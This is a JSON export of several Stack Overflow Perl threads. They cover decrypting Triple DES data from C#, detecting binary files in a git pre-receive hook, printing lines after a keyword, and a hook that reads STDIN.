"edited": false, "score": 0, "creation_date": 1496858790, "post_id": 44418137, "comment_id": 75838175, "body": "No reason to use IO::Scalar after Perl 5.6"}], "tags": [], "owner": {"reputation": 2296, "user_id": 1575416, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/32e1e3caa938438115454a4688a3d4a2?s=128&d=identicon&r=PG", "display_name": "aggaton", "link": "https://stackoverflow.com/users/1575416/aggaton"}, "is_accepted": false, "score": 0, "last_activity_date": 1496944988, "last_edit_date": 1496944988, "creation_date": 1496852735, "answer_id": 44418137, "question_id": 44417915, "link": "https://stackoverflow.com/questions/44417915/encrypt-using-triple-des-in-c-decrypt-in-perl/44418137#44418137", "title": "Encrypt using Triple DES in C#, decrypt in perl", "body": "<p>Needed to decode before decrypting. As per the comment below, I changed the call to</p>\n\n<p>$inargs = decode_base64($inargs);</p>\n\n<p>right before call to decrypt.</p>\n"}], "owner": {"reputation": 2296, "user_id": 1575416, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/32e1e3caa938438115454a4688a3d4a2?s=128&d=identicon&r=PG", "display_name": "aggaton", "link": "https://stackoverflow.com/users/1575416/aggaton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 287, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1496944988, "creation_date": 1496852075, "question_id": 44417915, "link": "https://stackoverflow.com/questions/44417915/encrypt-using-triple-des-in-c-decrypt-in-perl", "title": "Encrypt using Triple DES in C#, decrypt in perl", "body": "<p>I am trying to encrypt a string of text in C# using triple des. The text eventually needs to be decrypted using perl. The text coming out the other end still looks like gobblygyk. Am I missing a flag on the cipher?</p>\n\n<p>C# encrypt:</p>\n\n<pre><code>    public static string EncryptString(string str)\n    {\n        using (var provider = new TripleDESCryptoServiceProvider())\n        {\n            provider.Mode = CipherMode.CBC;\n\n            provider.Key = Encoding.ASCII.GetBytes(\"THISIS24BYTESWORTHOFTEXT\");\n            provider.IV = Encoding.ASCII.GetBytes(\"01234567\");\n            provider.Padding = PaddingMode.PKCS7;\n\n            var hashBytes = EncryptStringToBytes(str, provider);\n\n            return Convert.ToBase64String(hashBytes);  \n        }\n    }\n\n    private static byte[] EncryptStringToBytes(string txt, TripleDESCryptoServiceProvider desAlg)\n    {\n\n        var encryptor = desAlg.CreateEncryptor(desAlg.Key, desAlg.IV);\n\n        using (var msEncrypt = new MemoryStream())\n        {\n            using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))\n            {\n                using (var swEncrypt = new StreamWriter(csEncrypt))\n                {\n                    swEncrypt.Write(txt);\n                }\n            }\n            return msEncrypt.ToArray();\n        }\n    }\n}\n</code></pre>\n\n<p>perl decrypt:</p>\n\n<pre><code>sub DecryptString { \nmy ($dbh, $args) = @_;\n\nmy $inargs = $args-&gt;{INPUT};\nmy $key=\"THISIS24BYTESWORTHOFTEXT\";\nmy $iv = \"01234567\";\n\nmy $cipher = Crypt::CBC-&gt;new(\n        -cipher =&gt; 'DES_EDE3',\n        -key =&gt; $key,\n        -literal_key =&gt; 1,\n        -iv =&gt; $iv,\n        -add_header =&gt; 0,\n        -keysize =&gt; 24,\n);\n\nreturn $cipher-&gt;decrypt($inargs);\n}\n</code></pre>\n"}, {"tags": ["git", "perl", "shell"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1496832647, "post_id": 44410436, "comment_id": 75819865, "body": "You can only guess. You can try <code>file</code>, or <a href=\"http://p3rl.org/MIME::Detect\" rel=\"nofollow noreferrer\">MIME::Detect</a>, <a href=\"http://p3rl.org/File::LibMagic\" rel=\"nofollow noreferrer\">File::LibMagic</a>, <a href=\"http://p3rl.org/File::MMagic\" rel=\"nofollow noreferrer\">File::MMagic</a>, ..."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496846426, "post_id": 44410436, "comment_id": 75830496, "body": "How do you define &quot;binary file&quot;?"}], "answers": [{"comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 2, "creation_date": 1496834953, "post_id": 44411078, "comment_id": 75821489, "body": "The <code>-s</code> switch you see in the OP is a switch to <code>git cat-file</code>, not to Perl. But apparently it has the same meaning (fetch the size)."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 4, "last_activity_date": 1496833966, "creation_date": 1496833966, "answer_id": 44411078, "question_id": 44410436, "link": "https://stackoverflow.com/questions/44410436/check-that-the-file-is-not-binary-in-pre-receive-hook/44411078#44411078", "title": "Check that the file is not binary in pre receive hook", "body": "<p>Perl has a number of file test operators which will tell you various things about a file (you're already using <code>-s</code>). These include the following (taken from <a href=\"https://perldoc.perl.org/functions/-X.html\" rel=\"nofollow noreferrer\">the documentatio</a>n):</p>\n\n<blockquote>\n  <p>-T  File is an ASCII or UTF-8 text file (heuristic guess).</p>\n  \n  <p>-B  File is a \"binary\" file (opposite of -T).</p>\n</blockquote>\n\n<p>It's worth emphasising that this is just a heuristic. Perl examines the start of the file and checks what proportion of the characters appear to be printable.</p>\n\n<p>So you can use these in your code like this:</p>\n\n<pre><code>if (-B $filename) {\n  # file is (probably) binary\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1518, "user_id": 2989411, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9546f7c525de9829c89ea5801a78af11?s=128&d=identicon&r=PG", "display_name": "ArturFH", "link": "https://stackoverflow.com/users/2989411/arturfh"}, "is_accepted": false, "score": 4, "last_activity_date": 1496905438, "last_edit_date": 1496905438, "creation_date": 1496835832, "answer_id": 44411701, "question_id": 44410436, "link": "https://stackoverflow.com/questions/44410436/check-that-the-file-is-not-binary-in-pre-receive-hook/44411701#44411701", "title": "Check that the file is not binary in pre receive hook", "body": "<p>It depends what you exactly want to achieve and by what cost. If you want to prevent accidentally commits of files being a result of compilation, just add a .gitignore file excluding them from being committed (btw, this is always a good idea, exclude also backup copies and editor temporary files) and in a hook check if extension of committed file is in allowed list.</p>\n\n<p>The aforementioned     -T/-B check in Perl is nice, however, it's good to read proposed documentation. It's less efficient than checking the extension, but it gives the answer using the real content of the file.</p>\n\n<p>If the -B/-T heuristic, as described in documentation, does not suit your needs, use file. In Perl you have few packages already available: </p>\n\n<pre><code>File::Type\nFile::LibMagic\nFile::MMagic\n</code></pre>\n\n<p>You will receive the MIME type of the file and you need to write some logic to interpret the result.</p>\n\n<p>Unless there are no specific requirements which we are not aware of, I personally would stuck to .gitignore and checking extensions. Optionally, you can consider some kind of stick (preferably virtual, as corporal punishment is generally frowned upon) for developers committing forbidden files into repository.</p>\n"}, {"tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": false, "score": 1, "last_activity_date": 1496842870, "creation_date": 1496842870, "answer_id": 44414376, "question_id": 44410436, "link": "https://stackoverflow.com/questions/44410436/check-that-the-file-is-not-binary-in-pre-receive-hook/44414376#44414376", "title": "Check that the file is not binary in pre receive hook", "body": "<p>You may have noticed that Git sometimes tells you \u201cbinary files ... and ... differ\u201d.</p>\n\n<p>According to <a href=\"https://stackoverflow.com/a/6134127/5830574\">this answer</a> to \na similar question Git checks whether a file is binary or not by looking at the\nfirst 8,000 bytes. If they contain a NUL byte, then Git considers the file to\nbe binary.</p>\n\n<p>You can use <code>git diff</code> in your hook and let Git decide:</p>\n\n<pre><code>if git diff --numstat $old $new -- $file | grep -q -P -e '-\\t-\\t'; then\n    # binary\nelse\n    # text\nfi\n</code></pre>\n\n<p>This is even possible for files that have nothing to do with Git and are not in any repository. If</p>\n\n<pre><code>git diff --no-index --numstat /dev/null $some_file\n</code></pre>\n\n<p>prints <code>dash-TAB-dash-TAB</code> then the file is binary (from Git's point of view). From the\n<a href=\"https://git-scm.com/docs/git-diff\" rel=\"nofollow noreferrer\">docs</a>:</p>\n\n<blockquote>\n<pre><code>git diff --no-index [--options] [--] [&lt;path&gt;\u2026\u200b]\n</code></pre>\n  \n  <p>This form is to compare the given two paths on the filesystem. </p>\n  \n  <p>...</p>\n\n<pre><code>--numstat\n</code></pre>\n  \n  <p>Similar to --stat, but shows number of added and deleted lines in decimal\n     notation and pathname without abbreviation, to make it more machine friendly.\n     <strong>For binary files, outputs two - instead of saying 0 0.</strong></p>\n</blockquote>\n"}], "owner": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 253, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1496905438, "creation_date": 1496832200, "question_id": 44410436, "link": "https://stackoverflow.com/questions/44410436/check-that-the-file-is-not-binary-in-pre-receive-hook", "title": "Check that the file is not binary in pre receive hook", "body": "<p>In my git pre-recieve hook on server side I get a list of files in commit by using this command:</p>\n\n<pre><code>my @new_file_list =  `git diff --name-only $old..$new`;;\n</code></pre>\n\n<p>I get a size of every file, by looping:</p>\n\n<pre><code>foreach $file (@new_file_list)\n{\n  $size = `git cat-file -s $new:$file`;\n</code></pre>\n\n<p>By using what command can I get a boolean variable, that will define, if the file in the commit is binary? \nSo I have a <strong>filename</strong> in the input, and <strong>$old $new</strong> revisions, what command can define, if the file is binary?</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["perl", "printing", "line", "keyword"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1496829677, "post_id": 44409390, "comment_id": 75817678, "body": "Please, show the bigger picture. Where are the lines coming from?"}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 8068440, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/74ec40b59ccce9a5e811d2ff4d85c2ea?s=128&d=identicon&r=PG&f=1", "display_name": "maz", "link": "https://stackoverflow.com/users/8068440/maz"}, "edited": false, "score": 0, "creation_date": 1496834179, "post_id": 44409480, "comment_id": 75820928, "body": "your first code works but it doesnt print the entire line for the line with the keyword it only prints the rest of the line after the keyword,how can i get around this?"}, {"owner": {"reputation": 2254, "user_id": 582206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9242ef14d422ef65d3a80263e5225572?s=128&d=identicon&r=PG", "display_name": "LHMathies", "link": "https://stackoverflow.com/users/582206/lhmathies"}, "edited": false, "score": 0, "creation_date": 1496836823, "post_id": 44409480, "comment_id": 75822918, "body": "<code>&#47;[^\\n]*apple.*&#47;s</code> will match from the start of the line containing &#39;apple&#39;. I&#39;m not sure if I like using <code>print &lt;&gt;</code> instead of setting a state and printing lines one at a time, it&#39;s neat but could be a problem if the file is huge."}, {"owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "reply_to_user": {"reputation": 2254, "user_id": 582206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9242ef14d422ef65d3a80263e5225572?s=128&d=identicon&r=PG", "display_name": "LHMathies", "link": "https://stackoverflow.com/users/582206/lhmathies"}, "edited": false, "score": 0, "creation_date": 1496837114, "post_id": 44409480, "comment_id": 75823159, "body": "@LHMathies Thanks for your suggestion. But user asking for only after match with containing word. For your second question, Not sure, I hope it won&#39;t make a memory problem because it will only print the data like a <code>cat</code> command (hope). If I&#39;m storing the data in variable ,  it will make a memory issue otherwise not a problem."}, {"owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "reply_to_user": {"reputation": 3, "user_id": 8068440, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/74ec40b59ccce9a5e811d2ff4d85c2ea?s=128&d=identicon&r=PG&f=1", "display_name": "maz", "link": "https://stackoverflow.com/users/8068440/maz"}, "edited": false, "score": 0, "creation_date": 1496837261, "post_id": 44409480, "comment_id": 75823247, "body": "@maz Post edited. And then start learning the <a href=\"https://perldoc.perl.org/perlre.html\" rel=\"nofollow noreferrer\">regex</a>"}, {"owner": {"reputation": 2254, "user_id": 582206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9242ef14d422ef65d3a80263e5225572?s=128&d=identicon&r=PG", "display_name": "LHMathies", "link": "https://stackoverflow.com/users/582206/lhmathies"}, "edited": false, "score": 0, "creation_date": 1496838638, "post_id": 44409480, "comment_id": 75824294, "body": "@mkHun Notice the first comment by the OP asking how to get the whole first line that contains the word. That was what I was replying to."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496846721, "post_id": 44409480, "comment_id": 75830734, "body": "Note that using <code>..</code> will fail if it&#39;s used in a sub (that&#39;s called more than once)."}], "tags": [], "owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "is_accepted": true, "score": 0, "last_activity_date": 1496844576, "last_edit_date": 1496844576, "creation_date": 1496829651, "answer_id": 44409480, "question_id": 44409390, "link": "https://stackoverflow.com/questions/44409390/print-lines-after-finding-a-key-word-in-perl/44409480#44409480", "title": "print lines after finding a key word in perl", "body": "<p>If your data in scalar variable we can use several methods</p>\n\n<p>Recommended method</p>\n\n<pre><code>($matching) =  $string=~ /([^\\n]*apple.+)/s;\nprint \"$matching\\n\";\n</code></pre>\n\n<p>And there is another way to do it</p>\n\n<pre><code>$string=~ /[^\\n]*apple.+/s; \nprint $&amp;; #it will print the data which is match.\n</code></pre>\n\n<p>If you reading the data from file, try the following</p>\n\n<pre><code>while (&lt;$fh&gt;)\n{\n  if(/apple/)\n  {\n     print &lt;$fh&gt;;\n  }\n}\n</code></pre>\n\n<p>Or else try the following one liner</p>\n\n<pre><code>perl -ne 'print &lt;&gt; and exit if(/apple/);' file.txt\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 1, "last_activity_date": 1496852797, "last_edit_date": 1496852797, "creation_date": 1496829759, "answer_id": 44409521, "question_id": 44409390, "link": "https://stackoverflow.com/questions/44409390/print-lines-after-finding-a-key-word-in-perl/44409521#44409521", "title": "print lines after finding a key word in perl", "body": "<p>Just keep a flag variable, set it to true when you see the string, print if the flag is true.</p>\n\n<pre><code>perl -ne 'print if $seen ||= /apple/'\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2254, "user_id": 582206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9242ef14d422ef65d3a80263e5225572?s=128&d=identicon&r=PG", "display_name": "LHMathies", "link": "https://stackoverflow.com/users/582206/lhmathies"}, "edited": false, "score": 1, "creation_date": 1496838493, "post_id": 44409754, "comment_id": 75824187, "body": "For data from a file, you can use <code>&#47;apple&#47;..0 and print for &lt;&gt;</code> -- because the constant <code>0</code> is compared to the line number and that&#39;s never zero. For strings, <code>&#47;$^&#47;</code> (note the order) will never match so <code>&#47;apple&#47;..&#47;$^&#47; and say for @string</code> is safe."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 2254, "user_id": 582206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9242ef14d422ef65d3a80263e5225572?s=128&d=identicon&r=PG", "display_name": "LHMathies", "link": "https://stackoverflow.com/users/582206/lhmathies"}, "edited": false, "score": 0, "creation_date": 1496846544, "post_id": 44409754, "comment_id": 75830589, "body": "@LHMathies, <code>.. 0==1</code> is far clearer and more efficient than <code>.. 0</code> and <code>.. &#47;$^&#47;</code>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496846690, "post_id": 44409754, "comment_id": 75830701, "body": "Note that using <code>..</code> will fail if it&#39;s used in a sub (that&#39;s called more than once)."}, {"owner": {"reputation": 2254, "user_id": 582206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9242ef14d422ef65d3a80263e5225572?s=128&d=identicon&r=PG", "display_name": "LHMathies", "link": "https://stackoverflow.com/users/582206/lhmathies"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496947139, "post_id": 44409754, "comment_id": 75884126, "body": "@ikegami When using <code>..</code>, any constant expression will be converted to an integer and compared to <code>$.</code>, so there&#39;s no difference between <code>0==1</code> and <code>0</code>. If you aren&#39;t reading lines from a file <code>$.</code> could be anything (and initially it&#39;s zero) so you need a non-constant expression that is always false."}, {"owner": {"reputation": 2254, "user_id": 582206, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9242ef14d422ef65d3a80263e5225572?s=128&d=identicon&r=PG", "display_name": "LHMathies", "link": "https://stackoverflow.com/users/582206/lhmathies"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496947770, "post_id": 44409754, "comment_id": 75884473, "body": "@ikegami Good point about using these in a subroutine; <code>..</code> will behave in an unexpected manner if it never encounters a true value for the right operand -- it will still be &#39;on&#39; when the subroutine is next called. In the file case you can get around it with <code>..eof</code> which is clearer and does reset the operator state; when iterating over an array you&#39;ll have to find some expression that&#39;s true for the last element. (Alternatively you can generate a reference to a new unnamed sub each time you want to call it)."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 1, "last_activity_date": 1496830406, "creation_date": 1496830406, "answer_id": 44409754, "question_id": 44409390, "link": "https://stackoverflow.com/questions/44409390/print-lines-after-finding-a-key-word-in-perl/44409754#44409754", "title": "print lines after finding a key word in perl", "body": "<p>It's not really clear where your data is coming from. Let's assume it's a string containing newlines. Let's start by splitting it into an array.</p>\n\n<pre><code>my @string = split /\\n/, $string;\n</code></pre>\n\n<p>We can then use the flip-flop operator to decide which lines to print. I'm using <code>\\0</code> as a regex that is very unlikely to match any string (so, effectively, it's always false).</p>\n\n<pre><code>for (@string) {\n  say if /apple / .. /\\0/;\n}\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 8068440, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/74ec40b59ccce9a5e811d2ff4d85c2ea?s=128&d=identicon&r=PG&f=1", "display_name": "maz", "link": "https://stackoverflow.com/users/8068440/maz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1751, "favorite_count": 0, "accepted_answer_id": 44409480, "answer_count": 3, "score": 0, "last_activity_date": 1496852797, "creation_date": 1496829450, "question_id": 44409390, "link": "https://stackoverflow.com/questions/44409390/print-lines-after-finding-a-key-word-in-perl", "title": "print lines after finding a key word in perl", "body": "<p>I have a variable $string and i want to print all the lines after I find a keyword in the line (including the line with keyword)</p>\n\n<pre><code>$string=~ /apple /;\n</code></pre>\n\n<p>I'm using this regexp to find the key word but I do not how to print lines after this keyword.  </p>\n"}, {"tags": ["git", "perl"], "comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1496827113, "post_id": 44407442, "comment_id": 75815800, "body": "You should explain how you run the script from command line, what are the arguments and similar details."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 2, "creation_date": 1496827957, "post_id": 44407442, "comment_id": 75816421, "body": "@\u0421\u0443\u0445\u043e\u043927: He said it was a <a href=\"https://git-scm.com/book/gr/v2/Customizing-Git-Git-Hooks\" rel=\"nofollow noreferrer\">git pre-receive hook</a>."}], "answers": [{"comments": [{"owner": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "edited": false, "score": 0, "creation_date": 1496826009, "post_id": 44407522, "comment_id": 75814961, "body": "so what file is it trying to open in my case? What can be a reason, that I it can not get inside of loop?"}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "reply_to_user": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "edited": false, "score": 0, "creation_date": 1496826959, "post_id": 44407522, "comment_id": 75815658, "body": "@IlyaBogomolnyy It is not entering in the loop because of no command line arguments. Check how this script is running and what cmd line arguments are there."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1496827586, "post_id": 44407522, "comment_id": 75816162, "body": "And if there&#39;s no arguments - it&#39;s reading STDIN. And so nothing is getting piped to it, either."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1496828010, "post_id": 44407522, "comment_id": 75816454, "body": "It seems to be doing the right thing. Git pre-receive hooks receive their input on STDIN."}, {"owner": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1496830775, "post_id": 44407522, "comment_id": 75818521, "body": "@DaveCross, so why is it empty in my case? How can I find it out on the server site?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "edited": false, "score": 0, "creation_date": 1496830863, "post_id": 44407522, "comment_id": 75818578, "body": "@IlyaBogomolnyy: No idea I&#39;m afraid. Might have more time to investigate later today."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "edited": false, "score": 0, "creation_date": 1496832195, "post_id": 44407522, "comment_id": 75819537, "body": "@IlyaBogomolnyy Are you sure the hook is getting called after all? I&#39;m thinking of the correct filename and execution flags. Is it called <code>pre-receive</code> and has <code>chmod 755</code>?"}, {"owner": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "edited": false, "score": 0, "creation_date": 1496832272, "post_id": 44407522, "comment_id": 75819594, "body": "It is getting called. And it works porperly till while(&lt;&gt;). I checked it by using a &quot;print&quot; command in different places."}, {"owner": {"reputation": 647, "user_id": 7734270, "user_type": "registered", "accept_rate": 48, "profile_image": "https://www.gravatar.com/avatar/709eda4c2408c069e0064b82c375ccfa?s=128&d=identicon&r=PG&f=1", "display_name": "dice2011", "link": "https://stackoverflow.com/users/7734270/dice2011"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1496832351, "post_id": 44407522, "comment_id": 75819650, "body": "@PerlDuck maybe I can use some commands inside of git hook, to clarify, why does it happening?"}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 3, "creation_date": 1496832353, "post_id": 44407522, "comment_id": 75819652, "body": "So there is some code <i>before</i> the <code>while(&lt;&gt;)</code>? Show that as well."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1496851920, "post_id": 44407522, "comment_id": 75834402, "body": "@Sobrique: <i>&quot;<code>&lt;&gt;</code> - the diamond operator - is also known and used as <code>&lt;ARGV&gt;</code>&quot;</i> No.   <code>&lt;ARGV&gt;</code> is different from <code>&lt;&gt;</code>, whose behaviour depends on whether there is anything in 